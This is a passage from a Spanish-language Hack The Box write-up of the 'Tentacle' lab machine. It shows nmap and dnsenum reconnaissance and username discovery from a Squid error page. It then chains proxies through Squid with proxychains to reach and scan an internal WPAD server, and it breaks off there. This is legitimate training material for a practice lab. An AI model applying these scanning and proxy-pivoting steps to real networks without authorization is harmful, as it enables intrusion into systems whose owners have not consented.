data-pagefind-body data-pagefind-meta=title data-pagefind-weight=10>Tentacle HTB Writeup</div></div><div class=onload-animation><div class="flex items-center gap-4 dark:text-neutral-400 flex-wrap gap-x-4 gap-y-2 mb-5 text-neutral-500" data-astro-cid-qtyrxm4s><div class="flex items-center" data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:calendar-today-outline-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:calendar-today-outline-rounded><path d="M5 22q-.825 0-1.412-.587T3 20V6q0-.825.588-1.412T5 4h1V3q0-.425.288-.712T7 2t.713.288T8 3v1h8V3q0-.425.288-.712T17 2t.713.288T18 3v1h1q.825 0 1.413.588T21 6v14q0 .825-.587 1.413T19 22zm0-2h14V10H5zM5 8h14V6H5zm0 0V6z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:calendar-today-outline-rounded></use></svg></div><span class="text-sm text-50 font-medium" data-astro-cid-qtyrxm4s>2024-08-08</span></div><div class="flex items-center" data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:menu-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:menu-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h16q.425 0 .713.288T21 17t-.288.713T20 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:menu-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-qtyrxm4s><a href=/archive/category/HackTheBox/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts in the HackTheBox category" data-astro-cid-qtyrxm4s>HackTheBox</a></div></div><div class="flex items-center" data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:tag-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:tag-rounded><path d="m9 16l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T6.3 18.8L7 16H4.275q-.5 0-.8-.387T3.3 14.75q.075-.35.35-.55t.625-.2H7.5l1-4H5.775q-.5 0-.8-.387T4.8 8.75q.075-.35.35-.55t.625-.2H9l.825-3.275Q9.9 4.4 10.15 4.2t.6-.2q.475 0 .775.375t.175.825L11 8h4l.825-3.275q.075-.325.325-.525t.6-.2q.475 0 .775.375t.175.825L17 8h2.725q.5 0 .8.387t.175.863q-.075.35-.35.55t-.625.2H16.5l-1 4h2.725q.5 0 .8.388t.175.862q-.075.35-.35.55t-.625.2H15l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T12.3 18.8L13 16zm.5-2h4l1-4h-4z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:tag-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-qtyrxm4s><div class="text-sm mx-1.5 text-[var(--meta-divider)] hidden" data-astro-cid-qtyrxm4s>/</div><a href=/archive/tag/Windows/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Windows tag" data-astro-cid-qtyrxm4s>Windows</a><div class="text-sm mx-1.5 text-[var(--meta-divider)]" data-astro-cid-qtyrxm4s>/</div><a href=/archive/tag/Hard/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Hard tag" data-astro-cid-qtyrxm4s>Hard</a></div></div></div></div><div class="overflow-hidden relative rounded-xl banner-container mb-8 onload-animation"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="" decoding=async height=375 loading=lazy src=/_astro/ten.DwiwQZA6_ZkVAdv.webp width=666 class="w-full h-full object-cover" style=object-position:center></div><div class="onload-animation custom-md dark:prose-invert markdown-content max-w-none mb-6 prose prose-base" data-pagefind-body><h1 id=skills><span style=color:#33acff>Skills</span><a href=#skills class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><ul><li>DNS Enumeration (dnsenum)</li><li>SQUID Proxy</li><li>WPAD Enumeration</li><li>OpenSMTPD v2.0.0 Exploit</li><li>SSH using Kerberos (gssapi)</li><li>Abusing .k5login file</li><li>Abusing krb5.keytab file</li></ul><h1 id=information-gathering><span style=color:#33acff>Information Gathering</span><a href=#information-gathering class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><p>Primero el ping de siempre a la IP de la maquina victima:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>ping</span><span style=color:#79b8ff> -c</span><span style=color:#79b8ff> 1</span><span style=color:#79b8ff> 10.10.10.224</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>PING</span><span style=color:#79b8ff> 10.10.10.224</span><span style=color:#e1e4e8> (10.10.10.224) 56(</span><span style=color:#b392f0>84</span><span style=color:#e1e4e8>) bytes of data.</span></span>
<span class=line><span style=color:#b392f0>64</span><span style=color:#9ecbff> bytes</span><span style=color:#9ecbff> from</span><span style=color:#9ecbff> 10.10.10.224:</span><span style=color:#9ecbff> icmp_seq=</span><span style=color:#79b8ff>1</span><span style=color:#9ecbff> ttl=</span><span style=color:#79b8ff>63</span><span style=color:#9ecbff> time=</span><span style=color:#79b8ff>133</span><span style=color:#9ecbff> ms</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>---</span><span style=color:#79b8ff> 10.10.10.224</span><span style=color:#9ecbff> ping</span><span style=color:#9ecbff> statistics</span><span style=color:#79b8ff> ---</span></span>
<span class=line><span style=color:#b392f0>1</span><span style=color:#9ecbff> packets</span><span style=color:#9ecbff> transmitted,</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> received,</span><span style=color:#9ecbff> 0%</span><span style=color:#9ecbff> packet</span><span style=color:#9ecbff> loss,</span><span style=color:#9ecbff> time</span><span style=color:#9ecbff> 0ms</span></span>
<span class=line><span style=color:#b392f0>rtt</span><span style=color:#9ecbff> min/avg/max/mdev</span><span style=color:#9ecbff> =</span><span style=color:#9ecbff> 133.304/133.304/133.304/0.000</span><span style=color:#9ecbff> ms</span></span>
<span class=line></span></code></pre><p>Iniciamos nuestro escaneo de puertos con nmap:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>sudo</span><span style=color:#9ecbff> nmap</span><span style=color:#79b8ff> -sS</span><span style=color:#79b8ff> -p-</span><span style=color:#79b8ff> --open</span><span style=color:#79b8ff> --min-rate</span><span style=color:#79b8ff> 4000</span><span style=color:#79b8ff> -n</span><span style=color:#79b8ff> -Pn</span><span style=color:#79b8ff> 10.10.10.224</span><span style=color:#79b8ff> -oG</span><span style=color:#9ecbff> nmap</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>PORT</span><span style=color:#9ecbff>     STATE</span><span style=color:#9ecbff> SERVICE</span></span>
<span class=line><span style=color:#b392f0>22/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  ssh</span></span>
<span class=line><span style=color:#b392f0>53/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  domain</span></span>
<span class=line><span style=color:#b392f0>88/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  kerberos-sec</span></span>
<span class=line><span style=color:#b392f0>3128/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  squid-http</span></span>
<span class=line></span>
<span class=line></span></code></pre><p>Copiamos los puertos en la clipboard para realizar escaneo de versiones:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>ports</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"$(</span><span style=color:#b392f0>cat</span><span style=color:#9ecbff> nmap </span><span style=color:#f97583>|</span><span style=color:#b392f0> grep</span><span style=color:#79b8ff> -oP</span><span style=color:#9ecbff> '\d{1,5}/open' </span><span style=color:#f97583>|</span><span style=color:#b392f0> awk</span><span style=color:#9ecbff> '{print $1}' FS='/' </span><span style=color:#f97583>|</span><span style=color:#b392f0> xargs</span><span style=color:#f97583> |</span><span style=color:#b392f0> tr</span><span style=color:#9ecbff> ' ' ',')"</span><span style=color:#e1e4e8>; ip_address</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"$(</span><span style=color:#b392f0>cat</span><span style=color:#9ecbff> nmap </span><span style=color:#f97583>|</span><span style=color:#b392f0> grep</span><span style=color:#79b8ff> -oP</span><span style=color:#9ecbff> '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' </span><span style=color:#f97583>|</span><span style=color:#b392f0> sort</span><span style=color:#79b8ff> -u</span><span style=color:#f97583> |</span><span style=color:#b392f0> head</span><span style=color:#79b8ff> -n</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff>)"</span><span style=color:#e1e4e8>; </span><span style=color:#79b8ff>echo</span><span style=color:#79b8ff> -e</span><span style=color:#9ecbff> "\n[*] Extracting information...\n"</span><span style=color:#f97583> ></span><span style=color:#9ecbff> extractPorts.tmp</span><span style=color:#e1e4e8>; </span><span style=color:#79b8ff>echo</span><span style=color:#79b8ff> -e</span><span style=color:#9ecbff> "\t[*] IP Address: </span><span style=color:#e1e4e8>$ip_address</span><span style=color:#9ecbff>"</span><span style=color:#f97583> >></span><span style=color:#9ecbff> extractPorts.tmp</span><span style=color:#e1e4e8>; </span><span style=color:#79b8ff>echo</span><span style=color:#79b8ff> -e</span><span style=color:#9ecbff> "\t[*] Open ports: </span><span style=color:#e1e4e8>$ports</span><span style=color:#9ecbff>\n"</span><span style=color:#f97583> >></span><span style=color:#9ecbff> extractPorts.tmp</span><span style=color:#e1e4e8>; </span><span style=color:#79b8ff>echo</span><span style=color:#e1e4e8> $ports </span><span style=color:#f97583>|</span><span style=color:#b392f0> tr</span><span style=color:#79b8ff> -d</span><span style=color:#9ecbff> '\n'</span><span style=color:#f97583> |</span><span style=color:#b392f0> xclip</span><span style=color:#79b8ff> -sel</span><span style=color:#9ecbff> clip</span><span style=color:#e1e4e8>; </span><span style=color:#79b8ff>echo</span><span style=color:#79b8ff> -e</span><span style=color:#9ecbff> "[*] Ports copied to clipboard\n"</span><span style=color:#f97583> >></span><span style=color:#9ecbff> extractPorts.tmp</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>cat</span><span style=color:#9ecbff> extractPorts.tmp</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>rm</span><span style=color:#9ecbff> extractPorts.tmp</span></span>
<span class=line></span>
<span class=line></span>
<span class=line><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Extracting information...</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>        [</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] </span><span style=color:#b392f0>IP</span><span style=color:#9ecbff> Address:</span><span style=color:#79b8ff> 10.10.10.224</span></span>
<span class=line><span style=color:#e1e4e8>        [</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] </span><span style=color:#b392f0>Open</span><span style=color:#9ecbff> ports:</span><span style=color:#9ecbff> 22,53,88,3128</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Ports copied to clipboard</span></span>
<span class=line></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>nmap</span><span style=color:#79b8ff> -p22,53,88,3128</span><span style=color:#79b8ff> -sVC</span><span style=color:#79b8ff> 10.10.10.224</span><span style=color:#79b8ff> -Pn</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>PORT</span><span style=color:#9ecbff>     STATE</span><span style=color:#9ecbff> SERVICE</span><span style=color:#9ecbff>      VERSION</span></span>
<span class=line><span style=color:#b392f0>22/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  ssh</span><span style=color:#9ecbff>          OpenSSH</span><span style=color:#79b8ff> 8.0</span><span style=color:#e1e4e8> (protocol </span><span style=color:#79b8ff>2.0</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> ssh-hostkey:</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>   3072</span><span style=color:#9ecbff> 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c</span><span style=color:#e1e4e8> (RSA)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>   256</span><span style=color:#9ecbff> f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99</span><span style=color:#e1e4e8> (ECDSA)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_</span><span style=color:#79b8ff>  256</span><span style=color:#9ecbff> 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b</span><span style=color:#e1e4e8> (ED25519)</span></span>
<span class=line><span style=color:#b392f0>53/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  domain</span><span style=color:#9ecbff>       ISC</span><span style=color:#9ecbff> BIND</span><span style=color:#79b8ff> 9.11.20</span><span style=color:#e1e4e8> (RedHat </span><span style=color:#9ecbff>Enterprise</span><span style=color:#9ecbff> Linux</span><span style=color:#79b8ff> 8</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> dns-nsid:</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_</span><span style=color:#9ecbff>  bind.version:</span><span style=color:#9ecbff> 9.11.20-RedHat-9.11.20-5.el8</span></span>
<span class=line><span style=color:#b392f0>88/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  kerberos-sec</span><span style=color:#9ecbff> MIT</span><span style=color:#9ecbff> Kerberos</span><span style=color:#e1e4e8> (server </span><span style=color:#9ecbff>time:</span><span style=color:#9ecbff> 2024-08-06</span><span style=color:#9ecbff> 19:10:40Z</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>3128/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  http-proxy</span><span style=color:#9ecbff>   Squid</span><span style=color:#9ecbff> http</span><span style=color:#9ecbff> proxy</span><span style=color:#79b8ff> 4.11</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-title:</span><span style=color:#9ecbff> ERROR:</span><span style=color:#9ecbff> The</span><span style=color:#9ecbff> requested</span><span style=color:#9ecbff> URL</span><span style=color:#9ecbff> could</span><span style=color:#9ecbff> not</span><span style=color:#9ecbff> be</span><span style=color:#9ecbff> retrieved</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-server-header:</span><span style=color:#9ecbff> squid/4.11</span></span>
<span class=line><span style=color:#b392f0>Service</span><span style=color:#9ecbff> Info:</span><span style=color:#9ecbff> Host:</span><span style=color:#9ecbff> REALCORP.HTB</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>OS:</span><span style=color:#9ecbff> Linux</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>CPE:</span><span style=color:#9ecbff> cpe:/o:redhat:enterprise_linux:8</span></span>
<span class=line></span></code></pre><p>Los puertos abiertos que se muestran son <code>22 SSH</code>, <code>53 DNS</code>, <code>88 Kerberos</code> y <code>3128 HTTP-Proxy</code>. Nmap ya nos da el dominio de la máquina <code>REALCORP.HTB</code>. SSH normalmente no es tan interesante, así que comencemos nuestra enumeración con DNS.</p><h1 id=enumeration><span style=color:#33acff>Enumeration</span><a href=#enumeration class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><h2 id=port-53---dns>Port 53 - DNS<a href=#port-53---dns class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Para la enumeración de DNS voy a utilizar la herramienta dnsenum. Como ya conocemos el dominio, podemos utilizar esta herramienta para buscar nuevos subdominios.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>dnsenum</span><span style=color:#79b8ff> --threads</span><span style=color:#79b8ff> 100</span><span style=color:#79b8ff> --dnsserver</span><span style=color:#79b8ff> 10.10.10.224</span><span style=color:#79b8ff> -f</span><span style=color:#9ecbff> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span><span style=color:#9ecbff> realcorp.htb</span></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=142 loading=lazy src=/_astro/1.CpZknJqD_1O8KB6.webp width=733></p><p>Obtenemos dos subdominios interesantes <code>proxy y wpad</code> Sin embargo, al observar la dirección, parecen ser direcciones internas que el servidor DNS filtró accidentalmente. Todavía podemos agregar estas entradas a nuestro archivo <code>/etc/hosts</code>. Continuaremos nuestra enumeración mirando <code>Squid</code> (que se ejecuta en el puerto 3128).</p><h2 id=port-3128---http-proxy-squid>Port 3128 - HTTP-Proxy (Squid)<a href=#port-3128---http-proxy-squid class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p><img alt=img decoding=async height=591 loading=lazy src=/_astro/2.BBPL4K3x_Z1RUw5M.webp width=646></p><p>Obtenemos información valiosa de esta página de error:</p><ul><li>Un nombre de usuario <code>j.nakazawa</code> (y dominio, si no lo supiéramos ya)</li><li>Hora actual en la máquina (Importante, si trabajamos con Kerberos)</li><li>Otro subdominio <code>srv01.realcorp.htb</code></li><li>Versión calamar <code>4.11</code></li></ul><p>Agreguemos todos los host a nuestro archivo <code>/etc/hosts</code>.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>10.10.10.224</span><span style=color:#9ecbff>    srv01.realcorp.htb</span><span style=color:#9ecbff> realcorp.htb</span></span>
<span class=line><span style=color:#b392f0>10.197.243.31</span><span style=color:#9ecbff>   wpad.realcorp.htb</span></span>
<span class=line><span style=color:#b392f0>10.197.243.77</span><span style=color:#9ecbff>   ns.realcorp.htb</span><span style=color:#9ecbff> proxy.realcorp.htb</span></span>
<span class=line></span></code></pre><p>A continuación, intentemos acceder a la red interna (10.197.243.0) mediante cadenas proxy. Para esto tenemos que editar nuestra configuración de proxychains:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>sudo</span><span style=color:#9ecbff> nano</span><span style=color:#9ecbff> /etc/proxychains.conf</span></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=98 loading=lazy src=/_astro/3.6fEcLRZB_Z2qN6tP.webp width=548></p><p>Agregamos el proxy externo a nuestra configuración de cadenas de proxy, por lo que todo el tráfico que pasa por el túnel del proxy pasará por el proxy Squid.</p><p>hagamos un mapeo del proxy externo al salir del túnel (lado LAN del proxy).</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>proxychains</span><span style=color:#79b8ff> -q</span><span style=color:#9ecbff> nmap</span><span style=color:#79b8ff> -sT</span><span style=color:#79b8ff> -Pn</span><span style=color:#79b8ff> -n</span><span style=color:#79b8ff> 127.0.0.1</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Host</span><span style=color:#9ecbff> discovery</span><span style=color:#9ecbff> disabled</span><span style=color:#e1e4e8> (-Pn). All addresses will be marked </span><span style=color:#9ecbff>'up'</span><span style=color:#e1e4e8> and scan times will be slower.</span></span>
<span class=line><span style=color:#b392f0>Nmap</span><span style=color:#9ecbff> scan</span><span style=color:#9ecbff> report</span><span style=color:#9ecbff> for</span><span style=color:#79b8ff> 127.0.0.1</span></span>
<span class=line><span style=color:#b392f0>Host</span><span style=color:#9ecbff> is</span><span style=color:#9ecbff> up</span><span style=color:#e1e4e8> (0.46s </span><span style=color:#9ecbff>latency</span><span style=color:#e1e4e8>).</span></span>
<span class=line><span style=color:#b392f0>Not</span><span style=color:#9ecbff> shown:</span><span style=color:#79b8ff> 994</span><span style=color:#9ecbff> closed</span><span style=color:#9ecbff> ports</span></span>
<span class=line><span style=color:#b392f0>PORT</span><span style=color:#9ecbff>     STATE</span><span style=color:#9ecbff> SERVICE</span></span>
<span class=line><span style=color:#b392f0>22/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  ssh</span></span>
<span class=line><span style=color:#b392f0>53/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  domain</span></span>
<span class=line><span style=color:#b392f0>88/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  kerberos-sec</span></span>
<span class=line><span style=color:#b392f0>464/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  kpasswd5</span></span>
<span class=line><span style=color:#b392f0>749/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  kerberos-adm</span></span>
<span class=line><span style=color:#b392f0>3128/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  squid-http</span></span>
<span class=line></span></code></pre><p>Al escanear la interfaz interna del proxy externo, obtenemos dos puertos adicionales: <code>464 y 749.</code></p><h3 id=accessing-internal-resources>Accessing internal resources<a href=#accessing-internal-resources class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Al acceder al proxy externamente, la configuración del proxy puede definir a qué recursos se puede acceder desde el exterior.</p><p>Intentemos ver si tenemos acceso al proxy interno, que según DNS es <code>proxy.realcorp.htb (10.197.243.77)</code></p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>proxychains</span><span style=color:#79b8ff> -q</span><span style=color:#9ecbff> nmap</span><span style=color:#79b8ff> -sT</span><span style=color:#79b8ff> -Pn</span><span style=color:#79b8ff> -n</span><span style=color:#79b8ff> -p</span><span style=color:#79b8ff> 3128</span><span style=color:#79b8ff> 10.197.243.77</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>PORT</span><span style=color:#9ecbff>     STATE</span><span style=color:#9ecbff>    SERVICE</span></span>
<span class=line><span style=color:#b392f0>3128/tcp</span><span style=color:#9ecbff> filtered</span><span style=color:#9ecbff> squid-http</span></span>
<span class=line></span></code></pre><p>No obtenemos acceso al servidor proxy interno desde el exterior. Intentemos enrutar a través de la interfaz interna del proxy.</p><p>Aquí hay un esquema simplificado para explicar lo que estoy tratando de lograr:</p><p><img alt=img decoding=async height=330 loading=lazy src=/_astro/4.BOvHvue__Z1wXO6D.webp width=801></p><p>La línea negra nos muestra el acceso al proxy externamente desde nuestra máquina. La línea roja muestra que no es posible el acceso directo al proxy interno desde el exterior. La línea azul nos muestra haciendo proxy a través de la interfaz interna del proxy, antes de continuar con el proxy interno.</p><p>Para hacer esto, debemos agregar a nuestra ProxyList:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>nano</span><span style=color:#9ecbff> /etc/proxychains.conf</span><span style=color:#e1e4e8> </span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>http</span><span style=color:#79b8ff> 10.10.10.224</span><span style=color:#79b8ff> 3128</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>http</span><span style=color:#79b8ff> 127.0.0.1</span><span style=color:#79b8ff> 3128</span><span style=color:#e1e4e8> </span></span>
<span class=line></span></code></pre><p>Ahora deberíamos poder acceder al proxy interno (10.197.243.77).</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>proxychains</span><span style=color:#79b8ff> -q</span><span style=color:#9ecbff> nmap</span><span style=color:#79b8ff> -sT</span><span style=color:#79b8ff> -Pn</span><span style=color:#79b8ff> -n</span><span style=color:#79b8ff> -p</span><span style=color:#79b8ff> 3128</span><span style=color:#79b8ff> 10.197.243.77</span></span>
<span class=line><span style=color:#b392f0>Nmap</span><span style=color:#9ecbff> scan</span><span style=color:#9ecbff> report</span><span style=color:#9ecbff> for</span><span style=color:#79b8ff> 10.197.243.77</span></span>
<span class=line><span style=color:#b392f0>Host</span><span style=color:#9ecbff> is</span><span style=color:#9ecbff> up</span><span style=color:#e1e4e8> (0.16s </span><span style=color:#9ecbff>latency</span><span style=color:#e1e4e8>).</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>PORT</span><span style=color:#9ecbff>     STATE</span><span style=color:#9ecbff> SERVICE</span></span>
<span class=line><span style=color:#b392f0>3128/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  squid-http</span></span>
<span class=line></span></code></pre><p>agreguemos este proxy a nuestra cadena.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>nano</span><span style=color:#9ecbff> /etc/proxychains.conf</span><span style=color:#e1e4e8> </span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>http</span><span style=color:#79b8ff> 10.10.10.224</span><span style=color:#79b8ff> 3128</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>http</span><span style=color:#79b8ff> 127.0.0.1</span><span style=color:#79b8ff> 3128</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>http</span><span style=color:#79b8ff> 10.197.243.77</span><span style=color:#79b8ff> 3128</span></span>
<span class=line></span></code></pre><p>Ahora deberíamos poder acceder a la red interna.</p><p><img alt=img decoding=async height=515 loading=lazy src=/_astro/5.x5ir4jmq_27LANx.webp width=1353></p><h2 id=wpad-server>WPAD server<a href=#wpad-server class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Ahora que tenemos acceso a la red interna, deberíamos poder escanear el servidor wpad en busca de puertos abiertos.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>proxychains4</span><span style=color:#79b8ff> -q</span><span style=color:#9ecbff> nmap</span><span style=color:#79b8ff> -sT</span><span style=color:#79b8ff> -Pn</span><span style=color:#79b8ff> -n</span><span style=color:#79b8ff> 10.197.243.31</span></span>
<span class=line><span style=color:#b392f0>Nmap</span><span style=color:#9ecbff> scan</span><span style=color:#9ecbff> report</span><span style=color:#9ecbff> for</span><span style=color:#79b8ff> 10.197.243.31</span></span>
<span class=line><span style=color:#b392f0>Host</span><span style=color:#9ecbff> is</span><span style=color:#9ecbff> up</span><span style=color:#e1e4e8> (0.22s </span><span style=color:#9ecbff>latency</span><span style=color:#e1e4e8>).</span></span>
<span class=line><span style=color:#b392f0>Not</span><span style=color:#9ecbff> shown:</span><span style=color:#79b8ff> 993</span><span style=color:#9ecbff> closed</span><span style=color:#9ecbff> ports</span></span>
<span class=line><span style=color:#b392f0>PORT</span><span style=color:#9ecbff>     STATE</span><span style=color:#9ecbff> SERVICE</span></span>
<span class=line><span style=color:#b392f0>22/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  ssh</span></span>
<span class=line><span style=color:#b392f0>53/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  domain</span></span>
<span class=line><span style=color:#b392f0>80/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  http</span></span>
<span class=line><span style=color:#b392f0>88/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  kerberos-sec</span></span>
<span class=line><span style=color:#b392f0>464/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  kpasswd5</span></span>
<span class=line><span style=color:#b392f0>749/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  kerberos-adm</span></span>
<span class=line><span style=color:#b392f0>3128/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  squid-http</span></span>
<span class=line></span></code></pre><p>Intentemos acceder al sitio web.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>proxychains</span><span style=color:#9ecbff> firefox</span><span style=color:#9ecbff> wpad.realcorp.htb</span></span>
